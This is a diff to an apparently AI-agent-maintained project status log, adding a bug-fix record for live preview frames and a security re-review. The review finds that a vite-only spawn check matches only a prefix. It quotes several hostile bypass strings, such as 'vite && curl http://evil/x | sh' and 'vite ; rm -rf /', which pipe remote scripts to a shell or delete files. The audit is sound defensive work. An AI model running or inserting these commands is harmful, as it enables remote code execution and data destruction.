@@ -1850,6 +1850,180 @@ None blocking — this design is directly implementable by `panel-designer` (the
 
 ## Now
 
+### live-10 — live frames render on a local install, and the Tier-2 default only ever runs `vite`
+- **Agent:** main session (orchestrator), driven by dogfood on the owner's own `test4`.
+- **Stage:** done — branch `fix/live-frames-on-local-install`, stacked on
+  `feat/trust-tier-default-run-project` (PR #197); draft PR against that branch.
+- **Updated:** 2026-09-20.
+- **Goal:** with every project at Tier 2 by default (`sec-19`), the first real dogfood of a
+  live frame on this machine. It had never worked: `STUDIO-FIGMA-FEEL-PLAN.md` line 35 says no
+  project had ever been promoted, and Track L was code-verified only. Five defects, each found
+  by the browser, each fixed at its source; plus `sec-20`'s HIGH finding closed.
+- **What was wrong, in the order the browser hit it:**
+  1. **CSP `frame-ancestors 'none'`** — `liveOrigin.ts` emitted it whenever `PUBLIC_ORIGIN` was
+     unset, i.e. on every local install, so the board's live iframes were blocked by the browser
+     on every open. Now `ServerConfig.liveFrameAncestors` (`resolveLiveFrameAncestors`): public
+     origins ∪ `DEV_ORIGIN_ALLOWLIST` ∪ the admin server's own `localhost`/`127.0.0.1:<port>` —
+     the same set the CSRF check accepts as the editor. `DEV_ORIGIN_ALLOWLIST` moved to
+     `config.ts` because `liveOrigin.ts` may not import `auth/security.ts`.
+  2. **The proxy talked to the wrong server.** The project's Vite, told to listen on `localhost`,
+     bound only `::1` (Node binds the first resolved address), so Studio's own Vite on
+     `127.0.0.1:5174` looked free and both held "5174"; the proxy resolved `localhost` to IPv4 and
+     forwarded live requests to Studio's Vite, which answered the admin router's 404. The generated
+     `vite.config.js` now pins `server.host: '127.0.0.1'` (and `server.open` off under Studio — a
+     board opening no longer opens a browser tab), and `devServer.ts` rewrites a printed
+     `localhost` URL to `127.0.0.1`.
+  3. **A frame pointed at the proxy while the dev server was `booting` got a 503 and stayed on
+     it** — `liveFrame`'s identity does not follow readiness, so nothing re-pointed it. `LiveBoardFrame`
+     now hands out a `liveFrame` only at `phase === 'ready'`; the boot is still concurrent (prewarm
+     owns it).
+  4. **The bridge never booted.** The runtime's `parentOrigin` came from `PUBLIC_ORIGIN` alone;
+     unset, `main.jsx` created no bridge and the fallback never handed off. Now `devServer.ts`
+     passes `STUDIO_PARENT_ORIGINS` = `liveFrameAncestors` (csv), `runtimeConfig.ts` reads it as
+     `parentOrigins: string[]`, and the shell's `main.jsx` resolves which of them actually framed it
+     from `document.referrer` (`resolveParentOrigin`, `runtime.ts`) — the list says who may be a
+     parent, the referrer says which one is; `runtime.ts` itself keeps one `parentOrigin`.
+  5. **Vite crashed on `ECONNRESET`** when a live frame re-navigated (RTL toggle, a config
+     regeneration) or the admin restarted: Bun's outbound WebSocket RSTs the TCP connection (on
+     close, and later on GC of an abandoned socket — `liveOrigin.ts`'s "never close upstream" note
+     only delays it), Vite's HMR server had no `'error'` listener on the raw socket, Node exited the
+     process — and the registry kept saying `ready`. Two fixes: `studioRuntimeIdPlugin` now
+     includes `studio-runtime-socket-guard` (`configureServer` → `'error'` no-op on every
+     connection), and `devServer.ts` flips an entry to `'failed'` (with the exit in its log) when
+     the process exits after `ready`, so the proxy stops forwarding and the board falls back.
+  Also: `BridgeFrameAdapter` queues every post until the frame reports `ready` (the parent used
+  to post into `about:blank` and log a target-origin warning per overlay), and
+  `registerProjectModules` no longer logs the expected `no-components-found` refusal as an error.
+- **`sec-20` HIGH, closed (and `sec-21`'s re-review HIGH — the rule is anchored at both ends, so `vite && curl … | sh` is refused; the five bypass strings are test cases):** the Tier-2 prewarm ran ANY project's `dev`/`start` script on open.
+  `liveCapability.ts` is now the one rule — the script Studio would run must be a `vite` invocation
+  (`vite`, `vite dev --port …`, `npx|bunx|pnpm exec|yarn vite`) — and `devServer.ts` refuses to
+  spawn anything else at any tier (`referenceRender` inherits it). Not the probed `framework`
+  (Studio's shell writes a `vite.config.js` into every project, and `test4`'s cached profile says
+  `unknown` for good) and not a lockfile (that clause only served the deleted auto-promotion and
+  kept `test4` — `node_modules`, no lockfile — off Live). The pill shows "Live needs Vite" at any
+  tier for such a project instead of "Live" over a static fallback.
+- **Measured (owner's `test4`, real browser):** dev server `ready` in ~700 ms; 3 live iframes,
+  0 fallbacks, bridge visible on all three; after toggling RTL→LTR (every frame re-navigates) still
+  `ready`, still 3 live, console clean except the admin MCP bridge reconnecting after a server
+  restart I caused. Before: 0 live frames ever.
+- **Scope:** `server/{config,liveOrigin,liveOrigin.test,index}.ts`, `server/auth/security.ts`,
+  `server/handlers/studio/{devServer,liveCapability}.ts`, `server/handlers/studio/prototypeShell/
+  bootstrapTemplates.ts`, `src/core/studio-runtime/{runtimeConfig,runtime,vitePlugin,index}.ts` +
+  regenerated `generated/*Bundle.ts`, `src/admin/pages/site/canvas/{LiveRuntimePill,BoardFramesLayer/
+  LiveBoardFrame,frameAdapter/BridgeFrameAdapter}.tsx|ts`, `src/admin/pages/site/studio/
+  registerProjectModules.ts`, tests (`serverConfig`, `security`, `liveCapability`, `devServer`,
+  `referenceRender`, `prototypeShell`, `vitePlugin`, `BridgeFrameAdapter` + broadcast/latency stubs,
+  new `parentOrigin.test.ts`), `docs/server.md` (live origin section).
+- **Landmines:** (1) the test fakes for a dev-server process now stay alive until killed or
+  `exit(code)` — a fake that "exits immediately" is read as a crash after ready, which is the
+  truth. (2) `resolveParentOrigin` depends on `document.referrer`; a `Referrer-Policy` of `no-referrer`
+  on the admin would silence every bridge. (3) The admin's `/admin/api/ai/credentials` answers 500 on
+  this machine (seen in every board load) — not touched here, someone should look.
+- **Verification:** see the PR body; `bun test` on server + architecture + canvas + server/runtime
+  suites, `bun run build`, `bun run lint`.
+- **Human action needed:** open `test4`, wait for the pill's dev server, watch the three frames swap
+  from the static render to the real app; toggle RTL; edit a label and watch HMR carry it into the
+  frame. Then a security-guard re-read of the vite-only spawn rule.
+
+### sec-21 — security re-review of the sec-20 fix + local live-frame CSP/origin changes (commit `1496421e`)
+- **Agent:** security-guard
+- **Stage:** done — review only, no source files changed
+- **Reviewed:** commit `1496421e` ("fix(live): live frames render on a local install, and Tier 2 only ever runs vite") on `fix/live-frames-on-local-install`, stacked on `feat/trust-tier-default-run-project`, viewed via `git show 1496421e` from the primary checkout (no branch switch, nothing modified or committed)
+- **Updated:** 2026-09-20
+
+**Verdict: APPROVED WITH FIXES — one HIGH finding, the sec-20 fix's core guarantee is bypassable with a trivial, realistic payload.** Everything else in this commit (frame-ancestors, parentOrigin resolution, the socket guard) is sound. Not blocking sec-20's original approval-with-fixes status, but the specific claim "Tier 2 only ever runs vite" / "the spawner refuses to spawn anything else at any tier" in the commit message and `liveCapability.ts`'s own doc comment is **false as shipped** — this is the same class of hole sec-20 was written to close, reopened by an incomplete pattern.
+
+---
+
+## Scope
+
+Read-only. Traced (not modified): `server/handlers/studio/{liveCapability,devServer}.ts` + their test files, `server/config.ts`, `server/auth/security.ts`, `server/liveOrigin.ts`, `src/core/studio-runtime/{runtime,runtimeConfig,vitePlugin}.ts`, `server/handlers/studio/prototypeShell/bootstrapTemplates.ts`, `src/admin/pages/site/canvas/frameAdapter/BridgeFrameAdapter.ts` (queuing change only — its origin check at line 271 is untouched by this commit and still correct), `src/__tests__/studio-runtime/parentOrigin.test.ts`, `src/__tests__/server/serverConfig.test.ts`.
+
+Ran (not fixed, not committed): one throwaway `bun -e '...'` one-liner (not `bun test`, did not touch the in-flight test run) exercising `VITE_INVOCATION` against adversarial strings.
+
+**Did not touch STATE.md** in the primary checkout: a `bun test` process (PID 68866 at write time, `bun test server src/__tests__/architecture src/__tests__/canvas src/__tests__/server src/__tests__/studio-runtime src/core/studio-runtime src/admin/pages/site/studio/__tests__`) was still running when this review finished, per the coordinator's instruction to write here instead.
+
+---
+
+## Findings by severity
+
+### HIGH — the "Studio only ever runs vite" gate is a prefix match, not a whole-command match; shell metacharacters after the `vite` token still execute — **NOT FIXED**
+
+`liveCapability.ts`'s `VITE_INVOCATION`:
+
+```ts
+const VITE_INVOCATION = /^\s*(?:(?:npx|bunx|pnpm|yarn)\s+(?:exec\s+)?)?vite(?:\s|$)/
+```
+
+This anchors the **start** of the string (`^`) and requires the token `vite` followed by either a single whitespace character or end-of-string. It does **not** anchor the end (no trailing `$` outside the `(?:\s|$)` alternation), so anything can follow that first whitespace character — including shell control operators. `resolveDevScript`/`resolveLiveCapability` only inspect the string; the actual execution path (`spawnEntry` → `Bun.spawn([packageManager, 'run', devScript.name])`) runs `npm run dev` (or yarn/pnpm/bun), and `npm run <script>` always shells out to the **full literal script text** from `package.json` via a real shell (`sh -c`) — that is how npm-family lifecycle scripts work, unconditionally, with no flag to suppress it. The `VITE_INVOCATION` check never sees or constrains anything past its own match; it only decides whether Studio attempts the spawn at all.
+
+Verified empirically (throwaway `bun -e`, not committed):
+
+```
+"vite"                                  -> true   (intended)
+"vite dev --port 4000"                  -> true   (intended)
+"npx vite" / "bunx vite" / "pnpm exec vite" / "yarn vite" -> true (intended)
+"vite && curl http://evil/x | sh"       -> true   ** bypass **
+"vite & curl evil.sh | bash &"          -> true   ** bypass **
+"vite `curl evil.sh`"                   -> true   ** bypass **
+"vite $(curl evil.sh)"                  -> true   ** bypass **
+"vite ; rm -rf /"                       -> true   ** bypass ** (space before `;` is enough)
+"vite --config ./evil.config.mjs"       -> true   (arbitrary JS config — inherent to running vite at all, not itself a bypass of the RULE, but worth naming: a vite.config.* is already a full JS module Studio will execute merely by running "vite")
+"vite; rm -rf /"                        -> false  (no space before `;` — the one case the existing test suite happens to be adjacent to, and it's the SAFE one)
+"vite-plugin-something" / "curl … | sh" / "echo hi && vite" -> false (correctly refused, not vite-prefixed)
+```
+
+**Concrete exploit path:** a malicious or compromised repository (GitHub import, zip upload, or a dependency that rewrites `package.json` post-install) ships `"scripts": { "dev": "vite && curl http://attacker/x | sh" }`. `resolveLiveCapability` reports `capable: true` (it matches the intended pattern for legitimate cases too — `vite && …` starts exactly like `vite --port 4000`). `spawnEntry` proceeds. `npm run dev` executes the full string through a shell, running `vite` **and then** the attacker's payload, unconditionally, the instant the single operator opens the project's canvas (Tier 2 is the default per `10c87c95`; no click, no confirmation, no tier gate stands between "open the board" and this). This is the exact sec-20 exploit (arbitrary code execution on canvas mount for any imported project), reopened by a check that looks like it closes it but only validates a prefix.
+
+**Test-suite blind spot, concretely named:** `liveCapability.test.ts`'s new "refuses a project whose dev/start script is not vite" test uses `makeVite('curl http://x/y | sh')` — a payload that does NOT start with `vite`, so it is correctly refused, and reads as if it were testing exactly this attack class. It never tries `'vite && curl http://x/y | sh'` (chained AFTER a legitimate vite prefix), which is the actual bypass. `devServer.test.ts`'s "refuses to spawn anything but vite" test only tries `{ start: 'node ./server.js' }` — same gap. Neither test suite exercises a vite-prefixed payload with a trailing shell operator.
+
+**Recommended fix (not applied — read-only review):** anchor the WHOLE command, not just its prefix — reject the command if it contains any shell metacharacter (`;`, `&`, `|`, `` ` ``, `$(`, `<`, `>`, newline) anywhere, in addition to the existing prefix check; or better, require the entire string (after the optional runner prefix and the `vite` token) to consist only of a bounded, allowlisted flag/arg grammar (e.g. `^(?:--?[\w-]+(?:[= ][\w.:/\\-]+)?\s*)*$` for everything following `vite`) and reject anything else, anchored with `$` at the true end of the string. Add the adversarial cases above (`vite && …`, `vite; …` with a leading space, `` vite `…` ``, `vite $(…)`) as explicit refused-cases in both `liveCapability.test.ts` and `devServer.test.ts`.
+
+### LOW / informational — `"vite --config ./evil.config.mjs"` passes, and a vite.config file is already arbitrary code — **not a bypass of this rule, but worth stating explicitly**
+
+Even a fully-anchored fix (see above) would still let a project's own `vite.config.{js,ts,mjs}` run arbitrary Node code the moment `vite` boots — that is inherent to "run vite" and is not new; it is the same trust extended to `styleCompileTier1.ts`'s PostCSS-config execution the codebase already accepts at Tier 1. Not a gap introduced by this commit; noting it only so the anchoring fix above isn't mistaken for a guarantee that "vite" itself is inert. Vite runs inside a real OS subprocess with `minimalSubprocessEnv()` (no secrets) and `cwd` pinned to the app root — same blast-radius-not-sandbox posture the rest of Tier 1/2 already documents.
+
+---
+
+## Sound, no change
+
+1. **`resolveLiveFrameAncestors` (`server/config.ts`) is a fixed, server-derived allowlist — no request input reaches it.** `[publicOrigins, DEV_ORIGIN_ALLOWLIST, http://localhost:<port>, http://127.0.0.1:<port>]`, deduplicated through `normalizeOrigins`/`normalizeOrigin` (the same `URL`-constructor-based, exact scheme+host+port normalization already reviewed sound in `sec-16`). Replacing local installs' previous `frame-ancestors 'none'` (which made Live frames simply never work locally, per the commit's own motivation) with this bounded set is a reasonable, non-broadening change: every entry is either operator-configured (`PUBLIC_ORIGIN`, `VITE_ALLOWED_ORIGIN`) or a fixed loopback origin. `DEV_ORIGIN_ALLOWLIST` is included unconditionally (not gated on NODE_ENV) — this is unchanged behavior relocated from `auth/security.ts`, where it already governed the CSRF `Origin` check before this commit; not a new exposure, just parity. The live listener is cookie-free (its own module doc), so a broader `frame-ancestors` has no session-hijack-via-framing implication even in the worst case.
+2. **`resolveParentOrigin` (`src/core/studio-runtime/runtime.ts:174-183`) is a narrowing heuristic, not the enforcement.** It picks ONE origin out of the small, server-derived allowlist based on `document.referrer` (a browser-set value the embedding page cannot forge to an origin it is not actually served from), and the real enforcement is unchanged and still correct: `createStudioRuntimeBridge`'s inbound listener checks `ev.origin !== parentOrigin` (exact match, `runtime.ts:614`) before acting on anything, and every outbound `postMessage` targets that same single resolved origin (`runtime.ts:406`) — never `'*'`. Worst case for a spoofed/ambiguous referrer is the bridge either doesn't boot (`null` → no bridge) or binds to a different-but-still-allowlisted origin; an attacker cannot make it bind to an arbitrary one. Verified against `parentOrigin.test.ts`'s cases (empty referrer, `evil.example`, garbage string, empty allowlist) — all correctly return `null`.
+3. **`BridgeFrameAdapter`'s parent-side origin check is unchanged and correct.** `handleWindowMessage` still does `if (ev.origin !== this.frameOrigin) return` (`BridgeFrameAdapter.ts:271`, untouched by this commit) and `post()` still targets an explicit `this.frameOrigin`, never `'*'` — the new queue-until-`ready` logic only changes *when* posts fire, not *where*.
+4. **`server.host` pinned to `127.0.0.1`, not broadened.** `bootstrapTemplates.ts`'s generated `vite.config.js` now explicitly binds `127.0.0.1` (previously the default `'localhost'`, which could resolve to `::1` and cause the proxy-vs-bind mismatch the commit fixes) — still loopback-only, never `0.0.0.0`. `server.open` is correctly disabled only when Studio itself spawned the process (`!process.env.STUDIO_LIVE_BASE_PATH_ENV`), so a user's own `npm run dev` still opens a tab as expected.
+5. **`studio-runtime-socket-guard`'s no-op `'error'` listener is a reliability fix, not a security regression.** It swallows `ECONNRESET`-class errors on every connection to the project's own Vite dev server to stop Bun's outbound-WebSocket RST from crashing the whole process. Informational note only: it logs nothing, so a flood of malformed connections against the dev server (already loopback-only, reachable only by local processes under the existing single-operator threat model) would leave no trace — low severity, not something this review is blocking on.
+6. **The `entry.proc.exited` → `'failed'` transition (`devServer.ts`, `raceBoot`) is a correct liveness fix**, closing the previously-possible state where a crashed-after-ready process stayed `'ready'` in the registry and the proxy kept forwarding to a dead port. No new attack surface — `stopDevServer`'s kill path and the registry's per-request read (already reviewed sound in `sec-20`) are unaffected.
+
+---
+
+## Verification
+
+- Empirical: `bun -e` one-liner against `VITE_INVOCATION` (12 cases, transcribed above) — 5 confirmed bypasses. Not run as part of, and does not conflict with, the in-flight `bun test` process.
+- Did not run `bun test`/`bun run build`/`bun run lint` myself — a `bun test` process covering `server`, `src/__tests__/architecture`, `src/__tests__/canvas`, `src/__tests__/server`, `src/__tests__/studio-runtime`, `src/core/studio-runtime`, `src/admin/pages/site/studio/__tests__` was already running in this checkout at review time; starting a second one would race it. Read the new tests in the diff directly instead (`devServer.test.ts`'s "refuses to spawn anything but vite", `liveCapability.test.ts`'s rewritten `describe` blocks, `parentOrigin.test.ts`, `serverConfig.test.ts`'s `resolveLiveFrameAncestors` cases) — all correctly assert the *intended* behavior; none exercise the chained-shell-operator bypass.
+
+**Adversarial inputs traced (code-level):** `"vite && curl http://evil/x | sh"`, `"vite & curl evil.sh | bash &"`, `` "vite `curl evil.sh`" ``, `"vite $(curl evil.sh)"`, `"vite ; rm -rf /"` (all pass the gate, confirmed via the one-liner above); `document.referrer` = empty string / `https://evil.example/` / a non-URL string / a value not on an empty allowlist (all correctly return `null` per `parentOrigin.test.ts`, read not re-run); a local install with `PUBLIC_ORIGIN` unset (frame-ancestors now resolves to the bounded local+dev set instead of `'none'`, read not re-run against a live server).
+
+---
+
+## Security-guard checklist (this change)
+
+- **Paths** — n-a.
+- **Archives** — n-a.
+- **Write targets** — n-a, no new write target.
+- **Subprocesses** — **HIGH finding above.** `cwd`, capped output, and `minimalSubprocessEnv()` are all unchanged and still correct; the new element (which command is allowed to run at all) is exactly what the finding is about. No shell interpolation of a Studio-controlled string — the vulnerability is that the WORKSPACE's own `package.json` string is interpolated into a real shell by `npm run`, which is inherent to the feature and only mitigated (incompletely) by the prefix check.
+- **Secrets** — pass, unaffected.
+- **Capability gating** — pass; `requireTrustTier`/`studio.run.project` are untouched by this commit (already reviewed in `sec-20`).
+- **CSRF / origin** — pass; `resolveLiveFrameAncestors`, `resolveParentOrigin`, and the unchanged `ev.origin` checks are all sound, see "Sound, no change" above.
+
+---
+
+## Human action needed
+
+1. **Fix the HIGH finding before treating sec-20 as closed.** Anchor `VITE_INVOCATION` to the whole command (reject any shell metacharacter after the `vite` token, or require the remainder to match a bounded flag/arg grammar with a trailing `$`), and add the five bypass strings above as explicit refused-cases in `liveCapability.test.ts` and `devServer.test.ts`.
+2. **Update the commit's own claim.** "Studio only ever runs vite" / "the spawner refuses to spawn anything else at any tier" is stated as settled fact in `liveCapability.ts`'s doc comment and the commit message; once the anchoring fix lands, keep the claim — until then it is not true and a future reader will trust it.
+3. Everything else in this commit (frame-ancestors, parentOrigin, socket guard, ready-phase gating) is sound and needs no follow-up from this review.
+4. `sec-20`'s original "Human action needed" items #3/#4 (clean full-suite run once the worktree settles; sec-19's dogfood checklist) still stand.
+
 ### meta-13 — plan: "feels like Figma, never shows me an error" — `STUDIO-FIGMA-FEEL-PLAN.md`
 - **Agent:** main session (orchestrator) — seven read-only `studio-scout` audits, no code changed
 - **Stage:** done (plan written) — **wave 1 executed 2026-09-17**: 22 work orders + 3 security reviews landed as draft PRs #136–#159; per-work-order entries follow this one. Integration into `feat/alm-figma-killer-studio-shell` is the orchestrator's next step.
@@ -6895,7 +7069,8 @@ Integration commits on top: `dfb77061` (module-size re-count, plan record, one C
 - **Agent:** orchestrator (main session) · **Stage:** done — integrated by `meta-16` (PR #178) and merged as `be13d46f`; `verify-2` pending as a follow-up · **Updated:** 2026-09-18
 - **Base:** `27616ba8` = `feat/alm-figma-killer-studio-shell` after the `--no-ff` merge of PR #162 (wave 1). Clean merge, no conflicts; verification numbers are `meta-14`'s (the merge added only STATE.md commits on the shell side).
 - **Cleanup that preceded it:** review PRs #156/#157/#159/#161 closed as merged-via-#162; PRs #90–#98 and #127 (branches already contained in the shell branch) closed; 74 wave-1 remote branches + 85 remote branches whose PRs were squash-merged to `main` deleted; all local branches and the integration worktree removed. The remote now holds `main`, the shell branch, and two older branches with open PRs against `main` (#99 `feat/inspector-selection-model`, #86 `fix/ci-lint-and-server-suites`) that only the owner should decide on.
-- **Work orders (one Opus agent each, own worktree, draft PR → shell branch, handoff to scratch; `standing-05`):** `sec-14` per-route `requireCapability` + CSRF on every mutating Studio route (§6 decision 7) · `store-13` structural commits report created ids so ⌘D/Alt+drag/⌘G select the source-backed copy after resync, and `insertImportedNodes` never orphans (`mcp-21`) · `parser-13` CRLF-preserving codemods + `/?
+- **Work orders (one Opus agent each, own worktree, draft PR → shell branch, handoff to scratch; `standing-05`):** `sec-14` per-route `requireCapability` + CSRF on every mutating Studio route (§6 decision 7) · `store-13` structural commits report created ids so ⌘D/Alt+drag/⌘G select the source-backed copy after resync, and `insertImportedNodes` never orphans (`mcp-21`) · `parser-13` CRLF-preserving codemods + `/
+?
 /` in the parse path for users' repos · `verify-2` `bun run test:e2e` starts the stack on Windows, tracked ≥9-frame perf corpus, throwaway workspace copy so runs leave the tree clean · `panel-38` `FillSection` Mixed through the one selection model · `panel-39` the Design tab fits 900 px (ratchet → budget) · `verify-3` the Phase 0 exit dogfood as a Playwright spec · `perf-9` one frame mount pool · `mcp-24` `parityMatrix`/`studio_compare`/`studio_list_projects`/`compare.test.ts` arity/`guardProject` dead branch · `server-25` `deploy.ts` trust dir on monorepos, `SAFE_REPO_SEGMENT` `..`, `claudeCli` 0600 on win32 (icacls), `studio.test.ts` nested page · `canvas-20` cross-frame drag (atomic two-file move) + OS image file drop through a new bounded upload route.
 - **Next step:** security reviews of `sec-14`, `canvas-20`, `store-13`, `server-25`; integrator merge in dependency order; CLAUDE.md edits the agents flag; plan "Wave 2 — landed" table; final numbers here.
 - **Human action needed:** none yet.
